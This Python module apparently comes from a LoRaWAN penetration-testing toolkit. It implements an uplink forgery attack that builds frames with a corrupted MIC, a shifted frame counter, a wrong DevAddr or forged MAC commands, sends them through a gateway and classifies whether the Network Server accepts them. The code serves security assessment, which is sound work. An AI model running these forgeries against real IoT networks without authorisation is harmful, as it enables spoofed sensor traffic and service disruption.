"""Uplink forgery attack.

Constructs attacker-controlled uplinks and evaluates whether a Network Server
properly validates LoRaWAN security mechanisms:

* MIC integrity
* FCnt monotonicity
* DevAddr / session binding
* MAC command authenticity

Unlike the replay attack this scenario does **not** retransmit a previously
captured packet — it builds new frames with deliberately altered fields.
"""

from __future__ import annotations

import struct
from dataclasses import dataclass, field
from enum import Enum
from typing import TYPE_CHECKING, Any

from lora_attack_toolkit.attacks.base import BaseAttack
from lora_attack_toolkit.attacks.lifecycle import gateway_lifecycle
from lora_attack_toolkit.attacks.result import (
    AttackResult,
    Confidence,
    ExecutionStatus,
    SecurityVerdict,
)
from lora_attack_toolkit.config import AttackTiming, UplinkForgeryConfigV1
from lora_attack_toolkit.lorawan.frames import build_unconfirmed_data_up
from lora_attack_toolkit.lorawan.join import perform_otaa_join
from lora_attack_toolkit.lorawan.mac_commands import (
    CID_DUTY_CYCLE_ANS,
    CID_LINK_ADR_ANS,
    CID_LINK_CHECK_REQ,
    CID_RX_PARAM_SETUP_ANS,
    MACCommand,
    build_device_time_req,
    encode_mac_commands,
)

if TYPE_CHECKING:
    from lora_attack_toolkit.attacks.context import AttackContext

# ── Constants ─────────────────────────────────────────────────────────────────

_DEFAULT_TIMING = AttackTiming()
_RX_DRAIN_SEC = _DEFAULT_TIMING.rx2_delay_sec + _DEFAULT_TIMING.rx2_window_sec + 0.5
_FOPTS_MAX = 15  # LoRaWAN FOpts maximum length in bytes

# LoRaWAN 1.0.x MAC spec §4.3.1.5: the Network Server accepts an uplink whose
# FCnt is ahead of the last value by at most MAX_FCNT_GAP. Accepting a
# within-gap forward jump is therefore *expected* behaviour, not a vulnerability.
MAX_FCNT_GAP = 16384

# ── Verdict ───────────────────────────────────────────────────────────────────


class ForgeryVerdict(str, Enum):
    REJECTED = "rejected"
    ACCEPTED = "accepted"
    ACCEPTED_EXPECTED = "accepted_expected"
    POLICY_FINDING = "policy_finding"
    IGNORED = "ignored"
    INCONCLUSIVE = "inconclusive"


# ── Evidence record ───────────────────────────────────────────────────────────


@dataclass
class ForgeryEvidence:
    """Complete evidence collected during one forgery attempt."""

    forgery_mode: str
    dev_addr_hex: str
    fcnt_used: int
    payload_hex: str
    mic_strategy: str
    radio_frequency_hz: int
    radio_data_rate: str
    tx_timestamp: float
    tx_monotonic: float = 0.0
    fcnt_jump: int = 0
    """Configured forward FCnt jump (fcnt_used - last baseline FCnt); 0 if N/A."""
    downlink_received: bool = False
    downlink_count: int = 0
    attributable_accept: bool = False
    unattributable_downlink: bool = False
    downlink_frequency_hz: int | None = None
    downlink_data_rate: str | None = None
    downlink_concentrator_timestamp: int | None = None
    downlink_token: bytes | None = None
    control_probe_ran: bool = False
    control_probe_ok: bool = False
    verification_accepted: bool = False
    verdict: ForgeryVerdict = ForgeryVerdict.INCONCLUSIVE
    rationale: str = ""
    notes: list[str] = field(default_factory=list)


# ── Frame manipulation helpers ────────────────────────────────────────────────


def corrupt_mic(frame: bytes) -> bytes:
    """Bit-flip every byte of the 4-byte MIC trailer."""
    if len(frame) < 4:
        return frame
    return frame[:-4] + bytes(b ^ 0xFF for b in frame[-4:])


def _apply_mic_strategy(
    frame: bytes,
    recalculate_mic: bool,
    corrupt_mic_flag: bool,
    dev_addr_le: bytes,
    fcnt_up: int,
    fport: int,
    payload: bytes,
    app_s_key: bytes,
    nwk_s_key: bytes,
    f_opts: bytes = b"",
) -> tuple[bytes, str]:
    """Return ``(frame, mic_strategy_label)`` after applying the MIC strategy.

    Priority:
      1. ``recalculate_mic=True``  → rebuild frame with a fresh valid MIC.
      2. ``corrupt_mic=True``      → flip the existing MIC bits.
      3. Both false                → return frame unchanged.
    """
    if recalculate_mic:
        rebuilt = build_unconfirmed_data_up(
            dev_addr_le=dev_addr_le,
            fcnt_up=fcnt_up,
            f_port=fport,
            frm_payload=payload,
            app_s_key=app_s_key,
            nwk_s_key=nwk_s_key,
            confirmed=False,
            f_opts=f_opts,
        )
        return rebuilt, "recalculated"
    if corrupt_mic_flag:
        return corrupt_mic(frame), "corrupted"
    return frame, "original"


def _build_mac_command_fopts(mac_command_name: str) -> bytes:
    """Build the FOpts bytes for a ``mac_command_forgery`` frame."""
    cmd_map: dict[str, MACCommand] = {
        "DeviceTimeReq": build_device_time_req(),
        "LinkCheckReq": MACCommand(cid=CID_LINK_CHECK_REQ, payload=b""),
        "LinkADRAns": MACCommand(cid=CID_LINK_ADR_ANS, payload=b"\x07"),
        "DutyCycleAns": MACCommand(cid=CID_DUTY_CYCLE_ANS, payload=b""),
        "RXParamSetupAns": MACCommand(cid=CID_RX_PARAM_SETUP_ANS, payload=b"\x07"),
    }
    cmd = cmd_map.get(mac_command_name, build_device_time_req())
    return encode_mac_commands([cmd])[:_FOPTS_MAX]


# ── Verdict logic ─────────────────────────────────────────────────────────────


def determine_forgery_verdict(
    forgery_mode: str,
    mic_strategy: str,
    attributable_accept: bool,
    saw_unattributable: bool,
    control_probe_ok: bool,
    fcnt_jump: int | None = None,
) -> ForgeryVerdict:
    """Classify the Network Server response to a forged uplink.

    Attribution rule
    ----------------
    A downlink only counts as *acceptance evidence* when it both

    * passes :meth:`SimulatedDevice.process_downlink` validation
      (cryptographically bound to this device's session — DevAddr match,
      valid MIC, fresh FCntDown), **and**
    * arrives inside the forged uplink's RX1/RX2 window
      (:meth:`AttackTiming.in_rx_window` against the forged TX time).

    Such a downlink is ``attributable_accept``. A downlink that validates or
    arrives but cannot be attributed to the forged transaction is
    ``saw_unattributable`` and never proves vulnerability — it yields
    ``INCONCLUSIVE`` rather than over-claiming ``ACCEPTED``.

    When no attributable downlink is observed, a **control probe** (a known-valid
    uplink) decides between a meaningful rejection and an unreachable target:

    * control probe answered  → the path/NS is up, so silence to the forgery is
      a genuine ``REJECTED`` / ``IGNORED`` (secure);
    * control probe unanswered → the target may simply be down → ``INCONCLUSIVE``.

    ``valid_mic_modified_payload``
        Always ``ACCEPTED_EXPECTED`` — attacker possesses session keys.

    ``mac_command_forgery`` with a recalculated (valid) MIC
        ``ACCEPTED_EXPECTED`` when attributable, else ``INCONCLUSIVE``.

    ``fcnt_jump_forward`` with a recalculated (valid) MIC
        Acceptance is a FCnt-window *policy* question, not a MIC failure.
        LoRaWAN 1.0.x tolerates forward gaps up to :data:`MAX_FCNT_GAP`
        (16384), so accepting a within-gap jump is ``ACCEPTED_EXPECTED``
        (expected behaviour). A jump *at or beyond* the gap is reported as a
        ``POLICY_FINDING`` — a flagged observation rather than an automatic
        vulnerability, since 1.0.3 defines no explicit device-side rule.
    """
    if forgery_mode == "valid_mic_modified_payload":
        return ForgeryVerdict.ACCEPTED_EXPECTED

    if forgery_mode == "mac_command_forgery" and mic_strategy == "recalculated":
        return (
            ForgeryVerdict.ACCEPTED_EXPECTED if attributable_accept else ForgeryVerdict.INCONCLUSIVE
        )

    if (
        forgery_mode == "fcnt_jump_forward"
        and mic_strategy == "recalculated"
        and attributable_accept
    ):
        # Valid-MIC forward jump accepted: a robustness/policy observation.
        if fcnt_jump is None:
            return ForgeryVerdict.INCONCLUSIVE
        if fcnt_jump >= MAX_FCNT_GAP:
            return ForgeryVerdict.POLICY_FINDING
        return ForgeryVerdict.ACCEPTED_EXPECTED

    # Modes whose forged frame should be rejected by a secure Network Server.
    if attributable_accept:
        return ForgeryVerdict.ACCEPTED
    if saw_unattributable:
        return ForgeryVerdict.INCONCLUSIVE
    if control_probe_ok:
        return (
            ForgeryVerdict.IGNORED if forgery_mode == "wrong_devaddr" else ForgeryVerdict.REJECTED
        )
    return ForgeryVerdict.INCONCLUSIVE


def _forgery_verdict_to_security(
    verdict: ForgeryVerdict,
) -> tuple[SecurityVerdict, Confidence, bool | None]:
    """Map ForgeryVerdict to (SecurityVerdict, Confidence, target_protected)."""
    mapping: dict[ForgeryVerdict, tuple[SecurityVerdict, Confidence, bool | None]] = {
        ForgeryVerdict.REJECTED: (SecurityVerdict.SECURE, Confidence.HIGH, True),
        ForgeryVerdict.IGNORED: (SecurityVerdict.SECURE, Confidence.MEDIUM, True),
        ForgeryVerdict.ACCEPTED: (SecurityVerdict.VULNERABLE, Confidence.HIGH, False),
        ForgeryVerdict.ACCEPTED_EXPECTED: (SecurityVerdict.NOT_APPLICABLE, Confidence.HIGH, None),
        # A within-gap policy observation: flagged for review, not auto-vulnerable.
        ForgeryVerdict.POLICY_FINDING: (SecurityVerdict.INCONCLUSIVE, Confidence.MEDIUM, None),
        ForgeryVerdict.INCONCLUSIVE: (SecurityVerdict.INCONCLUSIVE, Confidence.LOW, None),
    }
    return mapping[verdict]


# ── Attack ────────────────────────────────────────────────────────────────────


class UplinkForgeryAttack(BaseAttack):
    """Uplink forgery attack.

    Evaluates Network Server behaviour in response to attacker-controlled
    uplinks with manipulated MIC, FCnt, DevAddr, or MAC commands.

    Attack flow
    -----------
    1.  Initialise device state.
    2.  Perform OTAA join (when ``perform_join=true``).
    3.  Send baseline uplinks to establish a valid session context.
    4.  Capture session state (DevAddr, FCnt, session keys).
    5.  Build a forged uplink according to ``forgery_mode``.
    6.  Transmit the forged uplink through the transport layer.
    7.  Observe Network Server response (RX1/RX2 window).
    8.  Send verification uplinks if applicable.
    9.  Produce a structured verdict and evidence report.
    """

    name = "uplink_forgery"

    def run(self, ctx: "AttackContext") -> AttackResult:
        cfg: UplinkForgeryConfigV1 = ctx.config
        ctx.logger.info("uplink_forgery_started mode=%s", cfg.forgery_mode)
        try:
            return self._run(ctx, cfg)
        except Exception as exc:  # noqa: BLE001
            # Top-level attack boundary: any unexpected failure becomes a
            # structured execution error (not a security verdict) so the runner
            # never crashes. Logged at error with full traceback.
            ctx.logger.exception("uplink_forgery_failed error=%s", exc)
            return AttackResult.failed(
                attack_name=self.name,
                attack_type="uplink_forgery",
                error=str(exc),
            )

    # ── Core execution ────────────────────────────────────────────────────────

    def _cancelled_result(self, mode: str) -> AttackResult:
        """Build a structured CANCELLED result (no security verdict implied)."""
        return AttackResult(
            attack_name=self.name,
            attack_type="uplink_forgery",
            execution_status=ExecutionStatus.CANCELLED,
            security_verdict=SecurityVerdict.INCONCLUSIVE,
            confidence=Confidence.LOW,
            interrupted=True,
            message=f"Uplink forgery [{mode}] cancelled by user",
        )

    def _run(self, ctx: "AttackContext", cfg: UplinkForgeryConfigV1) -> AttackResult:
        with gateway_lifecycle(ctx.gateway):
            ctx.clock.sleep(0.5, ctx.cancel_event)
            if ctx.cancel_event.is_set():
                return self._cancelled_result(cfg.forgery_mode)

            # 1. OTAA join
            if cfg.perform_join:
                ctx.logger.info("uplink_forgery_join_started")
                if not perform_otaa_join(
                    device=ctx.device,
                    gateway=ctx.gateway,
                    radio=ctx.radio,
                    timeout_sec=5.0,
                    logger=ctx.logger,
                ):
                    return AttackResult.failed(
                        attack_name=self.name,
                        attack_type="uplink_forgery",
                        error="OTAA join failed",
                        message="OTAA join failed — cannot proceed with forgery",
                    )
                ctx.logger.info("uplink_forgery_join_succeeded")

            # 2. Baseline uplinks
            self._send_baseline_uplinks(ctx, cfg)

            # 3. Capture session context
            session = self._capture_session(ctx, cfg)

            # Honour cancellation before emitting the forged frame — never
            # transmit an attack packet after the user has asked to stop.
            if ctx.cancel_event.is_set():
                return self._cancelled_result(cfg.forgery_mode)

            # 4–5. Build and transmit forged uplink
            evidence = self._forge_and_transmit(ctx, cfg, session)

            # 6. Drain RX window and attribute downlinks to the forged transaction.
            total, attributable, unattributable = self._drain_and_attribute(ctx, evidence)
            evidence.downlink_count = total
            evidence.downlink_received = total > 0
            evidence.attributable_accept = attributable > 0
            evidence.unattributable_downlink = unattributable > 0

            # 7. Verification uplinks
            if cfg.verification_uplink_count > 0 and cfg.forgery_mode not in {
                "wrong_devaddr",
                "valid_mic_modified_payload",
            }:
                evidence.verification_accepted = self._send_verification_uplinks(ctx, cfg)

            # 7b. Control probe — only when no attributable acceptance was seen, to
            # distinguish a meaningful rejection (path up) from an unreachable
            # target. Skipped for modes whose verdict never depends on it.
            if not evidence.attributable_accept and cfg.forgery_mode not in {
                "valid_mic_modified_payload",
            }:
                evidence.control_probe_ran = True
                evidence.control_probe_ok = self._control_probe(ctx, cfg)

            # 8. Verdict
            evidence.verdict = determine_forgery_verdict(
                forgery_mode=cfg.forgery_mode,
                mic_strategy=evidence.mic_strategy,
                attributable_accept=evidence.attributable_accept,
                saw_unattributable=evidence.unattributable_downlink,
                control_probe_ok=evidence.control_probe_ok,
                fcnt_jump=evidence.fcnt_jump,
            )
            evidence.rationale = self._build_rationale(evidence)

        ctx.logger.info(
            "uplink_forgery_completed mode=%s verdict=%s downlinks=%d",
            cfg.forgery_mode,
            evidence.verdict.value,
            evidence.downlink_count,
        )

        return self._build_result(evidence)

    # ── Step helpers ──────────────────────────────────────────────────────────

    def _send_baseline_uplinks(self, ctx: "AttackContext", cfg: UplinkForgeryConfigV1) -> None:
        """Send clean baseline uplinks to establish a valid session state."""
        for i in range(cfg.baseline_uplink_count):
            if ctx.cancel_event.is_set():
                return
            fcnt = ctx.device.runtime.fcnt_up
            frame = ctx.device.build_data_uplink(
                payload=bytes.fromhex(cfg.payload_hex),
                f_port=cfg.fport,
                confirmed=False,
            )
            radio = ctx.device.select_uplink_radio(fcnt, ctx.radio)
            ctx.gateway.forward_uplink(frame, radio)
            ctx.device.record_uplink_airtime(radio, len(frame), ctx.clock.monotonic())
            ctx.capture.capture_uplink(phy_payload=frame, fcnt=fcnt, packet_type="data_up")
            ctx.logger.info(
                "uplink_forgery_baseline_uplink_sent index=%d fcnt=%d freq_hz=%d",
                i,
                fcnt,
                radio.frequency,
            )
            # Drain RX window between baseline uplinks
            ctx.gateway.await_downlink(timeout_sec=_RX_DRAIN_SEC)
            remaining = max(0.0, cfg.uplink_interval_sec - _RX_DRAIN_SEC)
            if remaining > 0 and i < cfg.baseline_uplink_count - 1:
                ctx.clock.sleep(remaining, ctx.cancel_event)

    def _capture_session(self, ctx: "AttackContext", cfg: UplinkForgeryConfigV1) -> dict[str, Any]:
        """Snapshot device session state after baseline uplinks."""
        rt = ctx.device.runtime
        return {
            "dev_addr_le": rt.dev_addr_le,
            "dev_addr_hex": rt.dev_addr_le[::-1].hex() if rt.dev_addr_le else "00000000",
            "fcnt_up": rt.fcnt_up,
            "nwk_s_key": rt.nwk_s_key,
            "app_s_key": rt.app_s_key,
        }

    def _forge_and_transmit(
        self,
        ctx: "AttackContext",
        cfg: UplinkForgeryConfigV1,
        session: dict[str, Any],
    ) -> ForgeryEvidence:
        """Build a mode-specific forged frame, log, and transmit it."""
        mode = cfg.forgery_mode
        dev_addr_le: bytes = session["dev_addr_le"]
        nwk_s_key: bytes = session["nwk_s_key"]
        app_s_key: bytes = session["app_s_key"]
        current_fcnt: int = session["fcnt_up"]
        forged_payload = bytes.fromhex(cfg.forged_payload_hex)

        # ── Determine FCnt ─────────────────────────────────────────────────
        if mode == "fcnt_jump_forward":
            fcnt_used = (
                cfg.target_fcnt if cfg.target_fcnt is not None else current_fcnt + cfg.fcnt_delta
            )
        elif mode == "fcnt_reuse_with_modified_payload":
            fcnt_used = max(0, current_fcnt - 1)
        else:
            fcnt_used = current_fcnt

        # ── Determine DevAddr ──────────────────────────────────────────────
        used_addr_hex: str
        if mode == "wrong_devaddr":
            try:
                dev_addr_le = bytes.fromhex(cfg.wrong_devaddr)[::-1]
            except ValueError:
                dev_addr_le = bytes(4)
            used_addr_hex = cfg.wrong_devaddr
        else:
            used_addr_hex = session["dev_addr_hex"]

        # ── Build base frame and FOpts ─────────────────────────────────────
        f_opts = b""
        if mode == "mac_command_forgery":
            f_opts = _build_mac_command_fopts(cfg.mac_command)

        base_frame = build_unconfirmed_data_up(
            dev_addr_le=dev_addr_le,
            fcnt_up=fcnt_used,
            f_port=cfg.fport,
            frm_payload=forged_payload,
            app_s_key=app_s_key,
            nwk_s_key=nwk_s_key,
            confirmed=False,
            f_opts=f_opts,
        )

        # ── Apply MIC strategy ─────────────────────────────────────────────
        # ``valid_mic_modified_payload`` always uses a freshly computed MIC
        # (the payload is forged but keys are known); the user-supplied
        # ``recalculate_mic`` / ``corrupt_mic`` flags are ignored for this
        # mode to avoid surprising interaction with the default ``corrupt_mic=True``.
        if mode == "valid_mic_modified_payload":
            frame = base_frame
            mic_strategy = "recalculated"
        else:
            frame, mic_strategy = _apply_mic_strategy(
                frame=base_frame,
                recalculate_mic=cfg.recalculate_mic,
                corrupt_mic_flag=cfg.corrupt_mic,
                dev_addr_le=dev_addr_le,
                fcnt_up=fcnt_used,
                fport=cfg.fport,
                payload=forged_payload,
                app_s_key=app_s_key,
                nwk_s_key=nwk_s_key,
                f_opts=f_opts,
            )

        # ── Select radio channel via device layer ──────────────────────────
        radio = ctx.device.select_uplink_radio(fcnt_used, ctx.radio)

        ctx.logger.info(
            "uplink_forgery_frame_built mode=%s fcnt=%d devaddr=%s mic=%s freq_hz=%d payload=%s",
            mode,
            fcnt_used,
            used_addr_hex,
            mic_strategy,
            radio.frequency,
            cfg.forged_payload_hex,
        )

        tx_time = ctx.clock.unix_time()
        tx_mono = ctx.clock.monotonic()
        ctx.gateway.forward_uplink(frame, radio)
        ctx.device.record_uplink_airtime(radio, len(frame), tx_mono)
        ctx.capture.capture_uplink(phy_payload=frame, fcnt=fcnt_used, packet_type="data_up")

        ctx.logger.info(
            "uplink_forgery_frame_sent mode=%s fcnt=%d freq_hz=%d mic=%s",
            mode,
            fcnt_used,
            radio.frequency,
            mic_strategy,
        )

        return ForgeryEvidence(
            forgery_mode=mode,
            dev_addr_hex=used_addr_hex,
            fcnt_used=fcnt_used,
            payload_hex=cfg.forged_payload_hex,
            mic_strategy=mic_strategy,
            radio_frequency_hz=radio.frequency,
            radio_data_rate=radio.data_rate,
            tx_timestamp=tx_time,
            tx_monotonic=tx_mono,
            fcnt_jump=max(0, fcnt_used - current_fcnt) if mode == "fcnt_jump_forward" else 0,
        )

    def _drain_and_attribute(
        self, ctx: "AttackContext", evidence: ForgeryEvidence
    ) -> tuple[int, int, int]:
        """Drain the RX window and attribute downlinks to the forged transaction.

        Returns ``(total, attributable, unattributable)`` where a downlink is
        *attributable* only if it passes ``process_downlink`` validation **and**
        its receive time falls inside the forged uplink's RX1/RX2 window. Any
        other validated/received downlink is *unattributable* and must not be
        read as acceptance of the forgery.
        """
        poll = 0.3
        tx_mono = evidence.tx_monotonic
        deadline = (
            ctx.clock.monotonic()
            + _DEFAULT_TIMING.rx2_delay_sec
            + _DEFAULT_TIMING.rx2_window_sec
            + 1.0
        )
        total = 0
        attributable = 0
        unattributable = 0
        while ctx.clock.monotonic() < deadline:
            remaining = max(0.01, deadline - ctx.clock.monotonic())
            downlink = ctx.gateway.await_downlink_structured(timeout_sec=min(remaining, poll))
            if downlink is None:
                # Advance the clock so the window closes (instant under FakeClock,
                # real-time under WallClock) and the loop is guaranteed to terminate.
                ctx.clock.sleep(min(remaining, poll), ctx.cancel_event)
                continue
            total += 1
            rx_mono = ctx.clock.monotonic()
            raw = downlink.phy_payload
            ctx.capture.capture_downlink(phy_payload=raw, packet_type="data_down")
            # Record Semtech downlink metadata for attribution evidence / export.
            evidence.downlink_frequency_hz = downlink.frequency_hz
            evidence.downlink_data_rate = downlink.data_rate
            evidence.downlink_concentrator_timestamp = downlink.concentrator_timestamp
            evidence.downlink_token = downlink.token
            try:
                result = ctx.device.process_downlink(raw)
            except (ValueError, KeyError, struct.error) as exc:
                unattributable += 1
                ctx.logger.warning("uplink_forgery_downlink_parse_error error=%s", exc)
                continue
            in_window = _DEFAULT_TIMING.in_rx_window(tx_mono, rx_mono)
            if result.accepted and in_window:
                attributable += 1
                ctx.logger.info(
                    "uplink_forgery_attributable_downlink count=%d fcnt_32=%d",
                    attributable,
                    result.fcnt_32,
                )
            else:
                unattributable += 1
                ctx.logger.info(
                    "uplink_forgery_unattributable_downlink accepted=%s in_window=%s reason=%s",
                    result.accepted,
                    in_window,
                    result.reject_reason,
                )
        return total, attributable, unattributable

    def _control_probe(self, ctx: "AttackContext", cfg: UplinkForgeryConfigV1) -> bool:
        """Send a known-valid control uplink and report whether the path is up.

        The probe piggybacks a ``DeviceTimeReq`` MAC command so a reachable
        Network Server is expected to answer. ``True`` means a validated downlink
        was received (target/path up — a forgery rejection is therefore
        meaningful); ``False`` means no validated response (target may be down →
        the forgery result is inconclusive).
        """
        f_opts = encode_mac_commands([build_device_time_req()])[:_FOPTS_MAX]
        fcnt = ctx.device.runtime.fcnt_up
        frame = ctx.device.build_data_uplink(
            payload=bytes.fromhex(cfg.payload_hex),
            f_port=cfg.fport,
            confirmed=False,
            f_opts=f_opts,
        )
        radio = ctx.device.select_uplink_radio(fcnt, ctx.radio)
        tx_mono = ctx.clock.monotonic()
        ctx.gateway.forward_uplink(frame, radio)
        ctx.device.record_uplink_airtime(radio, len(frame), tx_mono)
        ctx.capture.capture_uplink(phy_payload=frame, fcnt=fcnt, packet_type="data_up")
        ctx.logger.info(
            "uplink_forgery_control_probe_sent fcnt=%d freq_hz=%d", fcnt, radio.frequency
        )

        poll = 0.3
        deadline = tx_mono + _DEFAULT_TIMING.rx2_delay_sec + _DEFAULT_TIMING.rx2_window_sec + 1.0
        while ctx.clock.monotonic() < deadline:
            remaining = max(0.01, deadline - ctx.clock.monotonic())
            raw = ctx.gateway.await_downlink(timeout_sec=min(remaining, poll))
            if raw is None:
                ctx.clock.sleep(min(remaining, poll), ctx.cancel_event)
                continue
            ctx.capture.capture_downlink(phy_payload=raw, packet_type="data_down")
            try:
                result = ctx.device.process_downlink(raw)
            except (ValueError, KeyError, struct.error) as exc:
                ctx.logger.warning("uplink_forgery_control_probe_parse_error error=%s", exc)
                continue
            if result.accepted:
                ctx.logger.info("uplink_forgery_control_probe_ok fcnt_32=%d", result.fcnt_32)
                return True
        ctx.logger.info("uplink_forgery_control_probe_no_response")
        return False

    def _build_rationale(self, evidence: ForgeryEvidence) -> str:
        """Explain the verdict in terms of the attribution / control-probe evidence."""
        if evidence.verdict == ForgeryVerdict.ACCEPTED_EXPECTED:
            if evidence.forgery_mode == "fcnt_jump_forward":
                return (
                    f"Forward FCnt jump of {evidence.fcnt_jump} is within MAX_FCNT_GAP "
                    f"({MAX_FCNT_GAP}); a valid-MIC within-gap jump being accepted is expected "
                    "LoRaWAN 1.0.x behaviour, not a vulnerability."
                )
            return (
                "Frame carries a valid MIC (attacker holds session keys); acceptance is expected."
            )
        if evidence.verdict == ForgeryVerdict.ACCEPTED:
            return (
                "A validated downlink attributable to the forged uplink "
                "(in its RX1/RX2 window) was observed — the target accepted the forgery."
            )
        if evidence.verdict == ForgeryVerdict.POLICY_FINDING:
            return (
                f"Forward FCnt jump of {evidence.fcnt_jump} (>= MAX_FCNT_GAP "
                f"{MAX_FCNT_GAP}) was accepted with a valid MIC. LoRaWAN 1.0.3 defines no "
                "explicit device-side gap rule, so this is flagged as a FCnt-window policy "
                "observation for review, not an automatic vulnerability."
            )
        if evidence.verdict in {ForgeryVerdict.REJECTED, ForgeryVerdict.IGNORED}:
            return (
                "No attributable downlink, but the control probe was answered — "
                "the path/target is up, so rejection of the forgery is meaningful."
            )
        # INCONCLUSIVE
        if evidence.unattributable_downlink:
            return (
                "Downlink(s) were seen but none could be attributed to the forged "
                "transaction (failed validation or fell outside its RX window)."
            )
        if evidence.control_probe_ran and not evidence.control_probe_ok:
            return (
                "No attributable downlink and the control probe was unanswered — "
                "the target may be unreachable, so no conclusion can be drawn."
            )
        return "Insufficient attributable evidence to reach a conclusion."

    def _send_verification_uplinks(self, ctx: "AttackContext", cfg: UplinkForgeryConfigV1) -> bool:
        """Send post-forgery verification uplinks.  Returns True on any downlink."""
        got_downlink = False
        for i in range(cfg.verification_uplink_count):
            ctx.clock.sleep(cfg.uplink_interval_sec, ctx.cancel_event)
            fcnt = ctx.device.runtime.fcnt_up
            frame = ctx.device.build_data_uplink(
                payload=bytes.fromhex(cfg.payload_hex),
                f_port=cfg.fport,
                confirmed=False,
            )
            radio = ctx.device.select_uplink_radio(fcnt, ctx.radio)
            ctx.gateway.forward_uplink(frame, radio)
            ctx.device.record_uplink_airtime(radio, len(frame), ctx.clock.monotonic())
            ctx.capture.capture_uplink(phy_payload=frame, fcnt=fcnt, packet_type="data_up")
            ctx.logger.info(
                "uplink_forgery_verification_uplink_sent index=%d fcnt=%d freq_hz=%d",
                i,
                fcnt,
                radio.frequency,
            )
            raw = ctx.gateway.await_downlink(timeout_sec=_RX_DRAIN_SEC)
            if raw is not None:
                got_downlink = True
                ctx.capture.capture_downlink(phy_payload=raw, packet_type="data_down")
        return got_downlink

    # ── Result builder ────────────────────────────────────────────────────────

    def _build_result(self, evidence: ForgeryEvidence) -> AttackResult:
        verdict = evidence.verdict
        _LABELS: dict[ForgeryVerdict, str] = {
            ForgeryVerdict.REJECTED: "Rejected (expected secure behaviour)",
            ForgeryVerdict.ACCEPTED: "Accepted (potentially vulnerable)",
            ForgeryVerdict.ACCEPTED_EXPECTED: (
                "Accepted (expected — attacker possesses session keys)"
            ),
            ForgeryVerdict.POLICY_FINDING: (
                "Accepted (FCnt-gap policy observation — review NS FCnt-window policy)"
            ),
            ForgeryVerdict.IGNORED: "Ignored (expected secure behaviour)",
            ForgeryVerdict.INCONCLUSIVE: "Inconclusive",
        }
        label = _LABELS.get(verdict, verdict.value)

        metrics: dict[str, Any] = {
            "forgery_mode": evidence.forgery_mode,
            "dev_addr": evidence.dev_addr_hex,
            "fcnt_used": evidence.fcnt_used,
            "payload_hex": evidence.payload_hex,
            "mic_strategy": evidence.mic_strategy,
            "frequency_hz": evidence.radio_frequency_hz,
            "data_rate": evidence.radio_data_rate,
            "tx_timestamp": evidence.tx_timestamp,
            "downlink_received": evidence.downlink_received,
            "downlink_count": evidence.downlink_count,
            "attributable_accept": evidence.attributable_accept,
            "unattributable_downlink": evidence.unattributable_downlink,
            "downlink_frequency_hz": evidence.downlink_frequency_hz,
            "downlink_data_rate": evidence.downlink_data_rate,
            "downlink_concentrator_timestamp": evidence.downlink_concentrator_timestamp,
            "downlink_token": (
                evidence.downlink_token.hex() if evidence.downlink_token is not None else None
            ),
            "control_probe_ran": evidence.control_probe_ran,
            "control_probe_ok": evidence.control_probe_ok,
            "verification_accepted": evidence.verification_accepted,
            "verdict": verdict.value,
            "verdict_label": label,
            "rationale": evidence.rationale,
        }

        sv, conf, protected = _forgery_verdict_to_security(verdict)
        return AttackResult(
            attack_name=self.name,
            attack_type="uplink_forgery",
            execution_status=ExecutionStatus.COMPLETED,
            security_verdict=sv,
            confidence=conf,
            target_protected=protected,
            message=f"Uplink forgery [{evidence.forgery_mode}]: {label}",
            metrics=metrics,
        )
